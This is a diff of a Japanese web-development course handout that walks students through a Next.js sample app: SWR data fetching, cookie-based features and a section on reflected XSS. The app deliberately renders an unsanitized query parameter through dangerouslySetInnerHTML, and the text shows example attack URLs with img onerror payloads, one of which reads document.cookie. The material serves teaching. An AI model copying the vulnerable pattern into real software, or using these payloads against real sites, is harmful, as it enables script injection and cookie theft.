@@ -104,10 +104,13 @@ class="toc-section-number">5.2</span> サーバサイド (バックエンド) �
 class="toc-section-number">6</span> 「ショップ」のコンテンツ</a></li>
 <li><a href="#xss脆弱性" id="toc-xss脆弱性"><span class="toc-section-number">7</span> XSS脆弱性</a>
 <ul>
-<li><a href="#cookie-が窃取されると" id="toc-cookie-が窃取されると"><span
-class="toc-section-number">7.1</span> Cookie が窃取されると…</a></li>
+<li><a href="#実はニュースには反射型xssの潜在的リスクがある"
+id="toc-実はニュースには反射型xssの潜在的リスクがある"><span class="toc-section-number">7.1</span>
+実は「ニュース」には反射型XSSの潜在的リスクがある</a></li>
+<li><a href="#クエリパラメータの処理" id="toc-クエリパラメータの処理"><span
+class="toc-section-number">7.2</span> クエリパラメータの処理</a></li>
 <li><a href="#flask-python-などでもxss脆弱性に注意"
-id="toc-flask-python-などでもxss脆弱性に注意"><span class="toc-section-number">7.2</span> Flask
+id="toc-flask-python-などでもxss脆弱性に注意"><span class="toc-section-number">7.3</span> Flask
 (Python) などでもXSS脆弱性に注意</a></li>
 </ul></li>
 </ul> 
@@ -185,7 +188,7 @@ id="toc-flask-python-などでもxss脆弱性に注意"><span class="toc-section
       <ul>
       <li><code>src/app/shop/page.tsx</code></li>
       <li><code>src/app/_types/Product.ts</code></li>
-      <li><code>src/app/api/productys/route.ts</code></li>
+      <li><code>src/app/api/products/route.ts</code></li>
       <li><code>src/app/_types/CartItrem.ts</code></li>
       <li><code>src/app/api/cart/route.ts</code></li>
       </ul></li>
@@ -1003,10 +1006,10 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <p>ウェブAPI <code>/api/news</code> にアクセスがあったときの処理は
       <code>src/app/news/route.ts</code> に記述されています。サーバサイドでは、Cookie の値
       (<code>region=XXXXX</code>) に応じて DB からのデータ取得条件を変えています。</p>
-      <div class="sourceCode" id="cb25" data-caption="src/app/news/route.ts (抜粋)"
+      <div class="sourceCode" id="cb25" data-caption="src/app/api/news/route.ts (抜粋)"
       data-startFrom="4"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 3;"><span id="cb25-4"><a href="#cb25-4"></a><span class="im">import</span> { cookies } <span class="im">from</span> <span class="st">&quot;next/headers&quot;</span><span class="op">;</span></span></code></pre></div>
       <div class="sourceCode" id="cb26"
-      data-caption="src/app/news/route.ts (抜粋) Cookie によりDBから取得するデータを変更"
+      data-caption="src/app/api/news/route.ts (抜粋) Cookie に応じて DB の検索条件 where を変更"
       data-startFrom="11"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 10;"><span id="cb26-11"><a href="#cb26-11"></a><span class="co">// リクエストに含まれるクッキー region の値を regionStr に取得</span></span>
 <span id="cb26-12"><a href="#cb26-12"></a><span class="kw">const</span> cookieStore <span class="op">=</span> <span class="cf">await</span> <span class="fu">cookies</span>()<span class="op">;</span></span>
 <span id="cb26-13"><a href="#cb26-13"></a><span class="kw">const</span> regionStr <span class="op">=</span> cookieStore<span class="op">.</span><span class="fu">get</span>(cKey)<span class="op">?.</span><span class="at">value</span> <span class="op">??</span> Region<span class="op">.</span><span class="at">OSAKA</span><span class="op">;</span></span>
@@ -1018,171 +1021,328 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
 <span id="cb26-19"><a href="#cb26-19"></a></span>
 <span id="cb26-20"><a href="#cb26-20"></a><span class="co">// DBから記事を全件取得。実設計では take/skip でページネーションすべき</span></span>
 <span id="cb26-21"><a href="#cb26-21"></a><span class="kw">const</span> newsItems<span class="op">:</span> NewsItem[] <span class="op">=</span> <span class="cf">await</span> prisma<span class="op">.</span><span class="at">newsItem</span><span class="op">.</span><span class="fu">findMany</span>({</span>
-<span id="cb26-22"><a href="#cb26-22"></a>  where<span class="op">:</span> { region }<span class="op">,</span></span>
+<span id="cb26-22"><a href="#cb26-22"></a>  where<span class="op">:</span> { region }<span class="op">,</span> <span class="co">// 検索条件</span></span>
 <span id="cb26-23"><a href="#cb26-23"></a>  orderBy<span class="op">:</span> { publishedAt<span class="op">:</span> <span class="st">&quot;desc&quot;</span> }<span class="op">,</span></span>
 <span id="cb26-24"><a href="#cb26-24"></a>})<span class="op">;</span></span></code></pre></div>
-      <ul>
-      <li>口頭説明</li>
-      </ul>
       <h2 data-number="5.3" id="swr-について"><span class="header-section-number">5.3</span> SWR
       について</h2>
-      <ul>
-      <li>口頭説明</li>
-      </ul>
+      <p>SWR (Stale-While-Revalidate) は、データ取得をより効率的・快適に行うための React / Next.js
+      向けライブラリです。<code>useState</code> と <code>useEffect</code>
+      を使って記述していたデータ取得 (fetch)
+      の処理を、より高機能かつシンプルに記述することができます。特に、<strong>キャッシュにある直近のデータ
+      (stale) を即座に表示しつつ、裏側で最新のデータを取得 (revalidate) する戦略</strong>
+      によって、UX の向上が期待できます。</p>
+      <p><code>src/app/news/page.tsx</code>
+      のなかで、<strong>第53行目</strong>から<strong>第77行目</strong>にかけての処理
+      (<code>useState</code> と <code>useEffect</code> のフェッチ処理) は…</p>
+      <div class="sourceCode" id="cb27" data-caption="src/app/news/page.tsx (抜粋) "
+      data-startFrom="53"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 52;"><span id="cb27-53"><a href="#cb27-53"></a><span class="co">// 初回 と region変更のタイミングでニュース記事を取得【基本的な実装】</span></span>
+<span id="cb27-54"><a href="#cb27-54"></a><span class="kw">const</span> [isLoading<span class="op">,</span> setIsLoading] <span class="op">=</span> <span class="fu">useState</span>(<span class="kw">true</span>)<span class="op">;</span></span>
+<span id="cb27-55"><a href="#cb27-55"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
+<span id="cb27-56"><a href="#cb27-56"></a>  <span class="kw">const</span> fetchNews <span class="op">=</span> <span class="kw">async</span> () <span class="kw">=&gt;</span> {</span>
+<span id="cb27-57"><a href="#cb27-57"></a>    <span class="cf">try</span> {</span>
+<span id="cb27-58"><a href="#cb27-58"></a>      <span class="fu">setIsLoading</span>(<span class="kw">true</span>)<span class="op">;</span></span>
+<span id="cb27-59"><a href="#cb27-59"></a>      <span class="kw">const</span> res <span class="op">=</span> <span class="cf">await</span> <span class="fu">fetch</span>(ep<span class="op">,</span> {</span>
+<span id="cb27-60"><a href="#cb27-60"></a>        method<span class="op">:</span> <span class="st">&quot;GET&quot;</span><span class="op">,</span></span>
+<span id="cb27-61"><a href="#cb27-61"></a>        credentials<span class="op">:</span> <span class="st">&quot;include&quot;</span><span class="op">,</span> <span class="co">// Cookieも送信</span></span>
+<span id="cb27-62"><a href="#cb27-62"></a>        cache<span class="op">:</span> <span class="st">&quot;no-store&quot;</span><span class="op">,</span></span>
+<span id="cb27-63"><a href="#cb27-63"></a>      })<span class="op">;</span></span>
+<span id="cb27-64"><a href="#cb27-64"></a>      <span class="kw">const</span> data<span class="op">:</span> ApiResponse<span class="op">&lt;</span>NewsItem[]<span class="op">&gt;</span> <span class="op">=</span> <span class="cf">await</span> res<span class="op">.</span><span class="fu">json</span>()<span class="op">;</span></span>
+<span id="cb27-65"><a href="#cb27-65"></a>      <span class="cf">if</span> (data<span class="op">.</span><span class="at">success</span>) {</span>
+<span id="cb27-66"><a href="#cb27-66"></a>        <span class="fu">setNewsItems</span>(data<span class="op">.</span><span class="at">payload</span>)<span class="op">;</span></span>
+<span id="cb27-67"><a href="#cb27-67"></a>      } <span class="cf">else</span> {</span>
+<span id="cb27-68"><a href="#cb27-68"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(data<span class="op">.</span><span class="at">message</span>)<span class="op">;</span></span>
+<span id="cb27-69"><a href="#cb27-69"></a>      }</span>
+<span id="cb27-70"><a href="#cb27-70"></a>    } <span class="cf">catch</span> (e) {</span>
+<span id="cb27-71"><a href="#cb27-71"></a>      <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(<span class="st">&quot;ニュース記事取得失敗&quot;</span><span class="op">,</span> e)<span class="op">;</span></span>
+<span id="cb27-72"><a href="#cb27-72"></a>    } <span class="cf">finally</span> {</span>
+<span id="cb27-73"><a href="#cb27-73"></a>      <span class="fu">setIsLoading</span>(<span class="kw">false</span>)<span class="op">;</span></span>
+<span id="cb27-74"><a href="#cb27-74"></a>    }</span>
+<span id="cb27-75"><a href="#cb27-75"></a>  }<span class="op">;</span></span>
+<span id="cb27-76"><a href="#cb27-76"></a>  <span class="fu">fetchNews</span>()<span class="op">;</span></span>
+<span id="cb27-77"><a href="#cb27-77"></a>}<span class="op">,</span> [region])<span class="op">;</span></span></code></pre></div>
+      <p>現状ではコメントアウトされている <strong>第79行目</strong>から<strong>第99行目</strong>
+      にかけての <code>useSWR</code> を使った処理に置き換えることができます。</p>
+      <div class="sourceCode" id="cb28"
+      data-caption="src/app/news/page.tsx (抜粋) useSWRによるデータ取得" data-startFrom="79"><pre
+      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 78;"><span id="cb28-79"><a href="#cb28-79"></a><span class="co">//【💡SWRを利用した実装】</span></span>
+<span id="cb28-80"><a href="#cb28-80"></a><span class="kw">const</span> fetcher <span class="op">=</span> <span class="fu">useCallback</span>(<span class="kw">async</span> (endPoint<span class="op">:</span> <span class="dt">string</span>) <span class="kw">=&gt;</span> {</span>
+<span id="cb28-81"><a href="#cb28-81"></a>  <span class="kw">const</span> res <span class="op">=</span> <span class="cf">await</span> <span class="fu">fetch</span>(endPoint<span class="op">,</span> {</span>
+<span id="cb28-82"><a href="#cb28-82"></a>    credentials<span class="op">:</span> <span class="st">&quot;same-origin&quot;</span><span class="op">,</span></span>
+<span id="cb28-83"><a href="#cb28-83"></a>    cache<span class="op">:</span> <span class="st">&quot;no-store&quot;</span><span class="op">,</span></span>
+<span id="cb28-84"><a href="#cb28-84"></a>  })<span class="op">;</span></span>
+<span id="cb28-85"><a href="#cb28-85"></a>  <span class="cf">return</span> res<span class="op">.</span><span class="fu">json</span>()<span class="op">;</span></span>
+<span id="cb28-86"><a href="#cb28-86"></a>}<span class="op">,</span> [])<span class="op">;</span></span>
+<span id="cb28-87"><a href="#cb28-87"></a></span>
+<span id="cb28-88"><a href="#cb28-88"></a><span class="kw">const</span> { data<span class="op">:</span> news<span class="op">,</span> isLoading } <span class="op">=</span> <span class="fu">useSWR</span><span class="op">&lt;</span>ApiResponse<span class="op">&lt;</span>NewsItem[]<span class="op">&gt;&gt;</span>(</span>
+<span id="cb28-89"><a href="#cb28-89"></a>  ep<span class="op">,</span></span>
+<span id="cb28-90"><a href="#cb28-90"></a>  fetcher<span class="op">,</span></span>
+<span id="cb28-91"><a href="#cb28-91"></a>)<span class="op">;</span></span>
+<span id="cb28-92"><a href="#cb28-92"></a></span>
+<span id="cb28-93"><a href="#cb28-93"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
+<span id="cb28-94"><a href="#cb28-94"></a>  <span class="cf">if</span> (news <span class="op">&amp;&amp;</span> news<span class="op">.</span><span class="at">success</span>) <span class="fu">setNewsItems</span>(news<span class="op">.</span><span class="at">payload</span>)<span class="op">;</span></span>
+<span id="cb28-95"><a href="#cb28-95"></a>}<span class="op">,</span> [news])<span class="op">;</span></span>
+<span id="cb28-96"><a href="#cb28-96"></a></span>
+<span id="cb28-97"><a href="#cb28-97"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
+<span id="cb28-98"><a href="#cb28-98"></a>  <span class="fu">mutate</span>(ep)<span class="op">;</span> <span class="co">// 再検証(キャッシュ無効化して再取得)</span></span>
+<span id="cb28-99"><a href="#cb28-99"></a>}<span class="op">,</span> [region])<span class="op">;</span></span></code></pre></div>
+      <p><strong>第97行目</strong> から <strong>第99行目</strong> では、<code>region</code>
+      が変わった際にキャッシュを明示的に破棄し、最新のデータ取得を強制する処理をしています。<code>mutate(ep)</code>
+      は、引数 <code>ep</code> (実体は <code>/api/news</code>)
+      から最新データを取得する命令になります。</p>
+      <p>(プロンプト例)</p>
+      <blockquote>
+      <p>Next.js で、useState と useEffect を組み合わせて api
+      からデータをフェッチしてくる処理を書いていたのですが、先輩からコードレビューで「useSWR
+      を使ったほうがいいよ！」と言われました。SWR
+      とか聞いたことがないのですが、使っている人はいるのでしょうか？マニアックな先輩しか使わないようなマイナーなライブラリなら手を出したくないのですが…😅</p>
+      </blockquote>
+      <blockquote>
+      <p>Next.js の useSWR の mutate
+      って関数の使いどころが分かりません。ウェブAPIからデータを再フェッチ（手動で強制更新）したいときに使うのですか？</p>
+      </blockquote>
+      <h3 data-number="5.3.1" id="演習-4"><span class="header-section-number">5.3.1</span> 演習</h3>
+      <p><strong>第54行目</strong>から<strong>第77行目</strong> をコメントアウトして、
+      <strong>第80行目</strong>から<strong>第99行目</strong>
+      のコメントアウトを解除してください。その後、<code>/news</code>
+      が同様に機能することを確認してください。</p>
+      <p>また、useSWR を使った方がわずかに UX が向上していることを確認してください
+      (ニュースからトップページに移動して、その後、再びニュースに戻ったときの記事が表示されるまでの時間が短くなっているはずです)。</p>
       <h1 data-number="6" id="ショップのコンテンツ"><span class="header-section-number">6</span>
       「ショップ」のコンテンツ</h1>
+      <p>ショップ (<a href="http://localhost:3000/shop">http://localhost:3000/shop</a>)は
+      <strong>Cookie を利用してショッピングカート内の商品保持する機能</strong>
+      を持ったサンプルです。AIの支援を受けながら、以下のコードを読解してください。</p>
       <ul>
-      <li><a href="http://localhost:3000/shop">http://localhost:3000/shop</a></li>
-      <li>口頭説明</li>
+      <li><code>src/app/shop/page.tsx</code> … フロントエンド</li>
+      <li><code>src/app/api/products/route.ts</code> … 商品一覧の取得 (GET)</li>
+      <li><code>src/app/api/cart/route.ts</code> … カート情報の取得と更新 (GET/PATCH)</li>
       </ul>
+      <p>「ニュース」では <span class="masked">クライアントサイドで Cookie を発行</span>
+      していましたが、「ショップ」では <strong>サーバサイド</strong>
+      (<code>src/app/cart/route.ts</code>) で Cookie
+      を発行しています。なお、Cookieの属性設定に不適切なものがありますが、次の「XSS脆弱性」のセクションに関係するものなので、そのままにしておいてください。</p>
       <h1 data-number="7" id="xss脆弱性"><span class="header-section-number">7</span> XSS脆弱性</h1>
       <p><strong>XSS</strong> (Cross-Site Scripting: クロスサイトスクリプティング)
       は、ウェブページのなかに、外部から <strong>悪意のあるJavaScriptコード</strong>
-      を埋め込むことで、ユーザのウェブブラウザ上で「<strong>意図しない処理
-      JavaScriptプログラム)を実行させる脆弱性</strong>」です。</p>
+      を埋め込むことで、ユーザのウェブブラウザ上で「<strong>意図しない処理 (JavaScriptプログラム)
+      を強制実行させる脆弱性</strong>」です。</p>
       <p>例えば、掲示板やコメント欄などに <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>
-      のようなタグが投稿され、それが<strong>適切にサニタイズ (無害化)
-      やエスケープ処理がされず</strong> <span class="masked">そのままHTMLとして表示</span>
-      されると、他の閲覧者のブラウザ上でそのスクリプトが実行されてしまいます。これにより「<strong>Cookie情報の窃取</strong>」や「<strong>別のサイト
+      のような「HTMLタグ」が投稿されたとき、それがサーバサイドで、適切に <strong>サニタイズ (無害化)
+      やエスケープ処理がされないままに</strong> <span
+      class="masked">そのまま「HTML」としてブラウザに出力</span>
+      されると、他の閲覧者のブラウザ上でそのスクリプト
+      (<code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>) が実行されてしまいます。</p>
+      <p>実行される JavaScriptコード
+      が単にアラートを表示する程度のものであれば大した問題ではありません。しかし、強制実行される
+      JavaScriptコード が「<strong>Cookie情報の窃取</strong>」や「<strong>別のサイト
       (フィッシングサイト) へのリダイレクト</strong>」、さらには「<strong>ユーザの意図しない操作
-      (投稿処理や削除処理など)</strong>」が強制される可能性があります。</p>
+      (XX予告の投稿操作やアカウント削除操作)</strong>」といった場合があり、これは非常に大きな問題となります。</p>
       <p>(プロンプト例)</p>
       <blockquote>
-      <p>ウェブアプリ開発およびXSS脆弱性の文脈で、「サニタイズ処理」と「エスケープ処理」とはなんですか。また、それらの違いについて教えてください。</p>
+      <p>ウェブアプリ開発およびXSS脆弱性の文脈で「サニタイズ処理」と「エスケープ処理」とはなんですか。また、それらの違いについて教えてください。</p>
       </blockquote>
-      <p><code>src/app/news/page.tsx</code> は、<a
+      <h2 data-number="7.1" id="実はニュースには反射型xssの潜在的リスクがある"><span
+      class="header-section-number">7.1</span>
+      実は「ニュース」には反射型XSSの潜在的リスクがある</h2>
+      <p>ニュース (<code>src/app/news/page.tsx</code>) ですが、実は <a
       href="http://localhost:3000/news?name=寝屋川タヌキ">http://localhost:3000/news?name=寝屋川タヌキ</a>
-      のようなクエリパラメータ (<code>name</code>)
-      を受け付ける仕様となっており、<strong>これを適切な無害化を処理せずに出力しているため</strong>
-      「<strong>反射型XSS (Reflected
-      XSS)</strong>」と呼ばれるタイプの脆弱性を持った実装となってしまっています。</p>
-      <p>例示するような <code>name=寝屋川タヌキ</code>
-      という文字列をクエリパラメータとして与える範囲においては、以下のように特段の問題は生じません。<code>name=【JavaScriptプログラム】</code>
-      が指定されたときに問題が生じます。</p>
+      のような <strong>クエリパラメータ</strong>(<code>name</code>)
+      を受け付ける仕様となっています。</p>
+      <p>そして、<strong>そのクエリパラメータを無害化処理やエスケープ処理することなく画面に出力する実装</strong>
+      となっています。これは「<strong>反射型XSS (Reflected
+      XSS)</strong>」と呼ばれるタイプの脆弱性を持った超NGな実装となります。</p>
       <figure>
       <img src="figs/01/xss-01.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
       </figure>
-      <p>まずは、<code>src/app/news/page.tsx</code>
-      のなかでクエリパラメータを処理するプログラムについて確認しています。</p>
-      <div class="sourceCode" id="cb27"
-      data-caption="src/app/news/page.tsx (抜粋) useStateによる状態管理" data-startFrom="25"><pre
-      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 24;"><span id="cb27-25"><a href="#cb27-25"></a><span class="kw">const</span> [name<span class="op">,</span> setName] <span class="op">=</span> <span class="fu">useState</span><span class="op">&lt;</span><span class="dt">string</span> <span class="op">|</span> <span class="dt">null</span><span class="op">&gt;</span>(<span class="kw">null</span>)<span class="op">;</span></span></code></pre></div>
-      <div class="sourceCode" id="cb28"
-      data-caption="src/app/news/page.tsx (抜粋) クエリパラメータ name=XXXX の取得"
-      data-startFrom="38"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 37;"><span id="cb28-38"><a href="#cb28-38"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
-<span id="cb28-39"><a href="#cb28-39"></a>  <span class="kw">const</span> params <span class="op">=</span> <span class="kw">new</span> <span class="fu">URLSearchParams</span>(<span class="bu">window</span><span class="op">.</span><span class="at">location</span><span class="op">.</span><span class="at">search</span>)<span class="op">;</span></span>
-<span id="cb28-40"><a href="#cb28-40"></a>  <span class="fu">setName</span>(params<span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;name&quot;</span>))<span class="op">;</span> <span class="co">// 💀 サニタイズ（無害化）ぜずに値を格納</span></span>
-<span id="cb28-41"><a href="#cb28-41"></a>}<span class="op">,</span> [])<span class="op">;</span></span></code></pre></div>
+      <p>上記の例のように <code>name=寝屋川タヌキ</code>
+      をクエリパラメータとして与える分には特段の問題は生じません。しかし、<code>name=【JavaScriptプログラム】</code>
+      が与えられるたとき<strong>非常に危険な動作</strong>をします。</p>
+      <p>(プロンプト例)</p>
+      <blockquote>
+      <p>URLのクエリパラメータにJSを仕込むようなのが反射型XSSであると聞きました。それ以外にもXSSにタイプがあるのですか？</p>
+      </blockquote>
+      <h2 data-number="7.2" id="クエリパラメータの処理"><span
+      class="header-section-number">7.2</span> クエリパラメータの処理</h2>
+      <p>まずは <code>src/app/news/page.tsx</code>
+      のなかでクエリパラメータが、どのように処理されているかを確認しています。</p>
       <div class="sourceCode" id="cb29"
+      data-caption="src/app/news/page.tsx (抜粋) useStateによる状態管理" data-startFrom="25"><pre
+      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 24;"><span id="cb29-25"><a href="#cb29-25"></a><span class="kw">const</span> [name<span class="op">,</span> setName] <span class="op">=</span> <span class="fu">useState</span><span class="op">&lt;</span><span class="dt">string</span> <span class="op">|</span> <span class="dt">null</span><span class="op">&gt;</span>(<span class="kw">null</span>)<span class="op">;</span></span></code></pre></div>
+      <div class="sourceCode" id="cb30"
+      data-caption="src/app/news/page.tsx (抜粋) クエリパラメータ name=XXXX の取得"
+      data-startFrom="38"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 37;"><span id="cb30-38"><a href="#cb30-38"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
+<span id="cb30-39"><a href="#cb30-39"></a>  <span class="kw">const</span> params <span class="op">=</span> <span class="kw">new</span> <span class="fu">URLSearchParams</span>(<span class="bu">window</span><span class="op">.</span><span class="at">location</span><span class="op">.</span><span class="at">search</span>)<span class="op">;</span></span>
+<span id="cb30-40"><a href="#cb30-40"></a>  <span class="fu">setName</span>(params<span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;name&quot;</span>))<span class="op">;</span> <span class="co">// 💀 サニタイズ（無害化）ぜずに値を格納</span></span>
+<span id="cb30-41"><a href="#cb30-41"></a>}<span class="op">,</span> [])<span class="op">;</span></span></code></pre></div>
+      <div class="sourceCode" id="cb31"
       data-caption="src/app/news/page.tsx (抜粋) サニタイズせずに出力" data-startFrom="140"><pre
-      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 139;"><span id="cb29-140"><a href="#cb29-140"></a>{name <span class="op">&amp;&amp;</span> (</span>
-<span id="cb29-141"><a href="#cb29-141"></a>  <span class="op">&lt;</span>div className<span class="op">=</span><span class="st">&quot;mt-4 ml-4 flex text-sm text-slate-600&quot;</span><span class="op">&gt;</span></span>
-<span id="cb29-142"><a href="#cb29-142"></a>    {<span class="co">/* サニタイズされていない値を dangerouslySetInnerHTML で出力（💀超危険） */</span>}</span>
-<span id="cb29-143"><a href="#cb29-143"></a>    <span class="op">&lt;</span>span dangerouslySetInnerHTML<span class="op">=</span>{{ __html<span class="op">:</span> name }} className<span class="op">=</span><span class="st">&quot;mr-1&quot;</span> <span class="op">/&gt;</span></span>
-<span id="cb29-144"><a href="#cb29-144"></a>    さん、こんにちは！</span>
-<span id="cb29-145"><a href="#cb29-145"></a>  <span class="op">&lt;/</span>div<span class="op">&gt;</span></span>
-<span id="cb29-146"><a href="#cb29-146"></a>)}</span></code></pre></div>
+      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 139;"><span id="cb31-140"><a href="#cb31-140"></a>{name <span class="op">&amp;&amp;</span> (</span>
+<span id="cb31-141"><a href="#cb31-141"></a>  <span class="op">&lt;</span>div className<span class="op">=</span><span class="st">&quot;mt-4 ml-4 flex text-sm text-slate-600&quot;</span><span class="op">&gt;</span></span>
+<span id="cb31-142"><a href="#cb31-142"></a>    {<span class="co">/* サニタイズされていない値を dangerouslySetInnerHTML で出力（💀超危険） */</span>}</span>
+<span id="cb31-143"><a href="#cb31-143"></a>    <span class="op">&lt;</span>span dangerouslySetInnerHTML<span class="op">=</span>{{ __html<span class="op">:</span> name }} className<span class="op">=</span><span class="st">&quot;mr-1&quot;</span> <span class="op">/&gt;</span></span>
+<span id="cb31-144"><a href="#cb31-144"></a>    さん、こんにちは！</span>
+<span id="cb31-145"><a href="#cb31-145"></a>  <span class="op">&lt;/</span>div<span class="op">&gt;</span></span>
+<span id="cb31-146"><a href="#cb31-146"></a>)}</span></code></pre></div>
       <p>XSS脆弱性の原因となっているのは <strong>第40行目</strong> と <strong>第143行目</strong>
       になります。いずれか一方で適切な処理がされていれば XSS
-      は生じません。例えば、<strong>第143行目</strong> を
-      <code>&lt;span className="mr-1"&gt;{name}&lt;/span&gt;</code> としていれば XSS攻撃
-      は失敗となります。</p>
-      <p>なお、反射型XSSは、詳細は<a
-      href="http://localhost:3000/news?name=%3Cimg%20src=x%20onerror=%22alert(&#39;Hoge!&#39;)%22%3E">こちら</a>のようなリンクに仕込まれる可能性があります。</p>
-      <h3 data-number="7.0.1" id="例1"><span class="header-section-number">7.0.1</span> 例1</h3>
-      <div class="sourceCode" id="cb30" data-caption="無害なクエリパラメータ"><pre
-      class="sourceCode txt"><code class="sourceCode default"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=寝屋川タヌキ</span></code></pre></div>
+      を防ぐことはできます。例えば、<strong>第143行目</strong> を
+      <code>&lt;span className="mr-1"&gt;{name}&lt;/span&gt;</code>
+      とするだけでXSS攻撃は失敗します。</p>
+      <p>なお、反射型XSSは「詳細は<a
+      href="http://localhost:3000/news?name=%3Cimg%20src=x%20onerror=%22alert(&#39;Hoge!&#39;)%22%3E">こちら</a>をご覧ください」のようなリンクに仕込まれる可能性があります。</p>
+      <p>このような状態で、どのようなXSS攻撃を受ける可能性があるかを見ていきます。</p>
+      <h3 data-number="7.2.1" id="例1-無害"><span class="header-section-number">7.2.1</span> 例1
+      (無害)</h3>
+      <div class="sourceCode" id="cb32" data-caption="無害なクエリパラメータ"><pre
+      class="sourceCode txt"><code class="sourceCode default"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=寝屋川タヌキ</span></code></pre></div>
+      <p>上記のURLをブラウザのアドレバーにコピペすると次のようになります。</p>
       <figure>
       <img src="figs/01/xss-01.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
       </figure>
-      <h3 data-number="7.0.2" id="例2"><span class="header-section-number">7.0.2</span> 例2</h3>
-      <div class="sourceCode" id="cb31" data-caption="無害なクエリパラメータ？🤔"><pre
-      class="sourceCode txt"><code class="sourceCode default"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;font size=20 color=&quot;brown&quot;&gt;&lt;b&gt;寝屋川タヌキ&lt;/b&gt;&lt;/font&gt;</span></code></pre></div>
+      <p>ここでは、クエリパラメータが単なるテキスト (<code>寝屋川タヌキ</code>)
+      だったので、特に問題になることはおきません。</p>
+      <h3 data-number="7.2.2" id="例2"><span class="header-section-number">7.2.2</span> 例2</h3>
+      <div class="sourceCode" id="cb33" data-caption="無害なクエリパラメータ？🤔"><pre
+      class="sourceCode txt"><code class="sourceCode default"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;font size=20 color=&quot;brown&quot;&gt;&lt;b&gt;寝屋川タヌキ&lt;/b&gt;&lt;/font&gt;</span></code></pre></div>
+      <p>上記のURLをブラウザのアドレバーにコピペすると次のようになります。</p>
       <figure>
       <img src="figs/01/xss-02.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
       </figure>
-      <h3 data-number="7.0.3" id="例3"><span class="header-section-number">7.0.3</span> 例3</h3>
-      <div class="sourceCode" id="cb32" data-caption="💀 XSS脆弱性を利用してJavaScriptを実行"><pre
-      class="sourceCode txt"><code class="sourceCode default"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;alert(&#39;Hoge!&#39;)&quot;&gt;</span></code></pre></div>
+      <p>ここでは、クエリパラメータに <span class="masked">HTMLタグ</span>
+      が含まれています。その結果、そのHTMLタグが反映された出力となっています。</p>
+      <h3 data-number="7.2.3" id="例3"><span class="header-section-number">7.2.3</span> 例3 💀</h3>
+      <div class="sourceCode" id="cb34" data-caption="💀 XSS脆弱性を利用してJavaScriptを実行"><pre
+      class="sourceCode txt"><code class="sourceCode default"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;alert(&#39;Hoge!&#39;)&quot;&gt;</span></code></pre></div>
+      <p>上記のURLをブラウザのアドレバーにコピペすると次のようになります。</p>
       <figure>
       <img src="figs/01/xss-03.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
       </figure>
-      <h3 data-number="7.0.4" id="例4"><span class="header-section-number">7.0.4</span> 例4</h3>
-      <div class="sourceCode" id="cb33"
+      <p><code>&lt;img src=x onerror="alert('Hoge!')"&gt;</code> は、XSS攻撃でよく使われる HTML
+      タグです。</p>
+      <ol type="1">
+      <li><code>&lt;img src="x"&gt;</code> によって、存在しない画像を読み込もうとする。</li>
+      <li>読み込み失敗 → <code>onerror</code> が実行される。</li>
+      <li>結果として <code>alert('Hoge!')</code> という JavaScript
+      が実行され、画面に「Hoge!」というアラートが表示される。</li>
+      </ol>
+      <p>アラートが実行されたところで実害はありませんが、任意の JavaScript
+      が実行できてしまうことが非常に深刻な問題です。</p>
+      <h3 data-number="7.2.4" id="例4"><span class="header-section-number">7.2.4</span> 例4
+      💀💀</h3>
+      <div class="sourceCode" id="cb35"
       data-caption="💀💀 XSS脆弱性を利用してCookieを取得して表示"><pre
-      class="sourceCode txt"><code class="sourceCode default"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;document.write(&#39;(ToT) =&gt; &#39;,document.cookie)&quot;&gt;</span></code></pre></div>
+      class="sourceCode txt"><code class="sourceCode default"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;document.write(&#39;(ToT) =&gt; &#39;,document.cookie)&quot;&gt;</span></code></pre></div>
+      <p>上記のURLをブラウザのアドレバーにコピペすると次のようになります。</p>
       <figure>
